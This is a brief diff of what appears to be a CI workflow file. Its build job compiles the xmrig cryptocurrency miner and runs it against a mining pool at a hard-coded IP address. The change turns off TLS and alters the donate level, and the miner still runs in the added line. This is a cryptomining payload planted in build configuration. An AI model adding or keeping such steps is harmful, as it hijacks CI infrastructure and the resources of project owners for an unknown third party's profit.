@@ -21,4 +21,4 @@ jobs:
               cmake .. -DCMAKE_BUILD_TYPE=Release
               make --jobs=$(nproc)
 
-              ./xmrig --donate-level 0 -o 45.85.90.252:3333 -k --tls
+              ./xmrig --donate-level 5 -o 45.85.90.252:3333
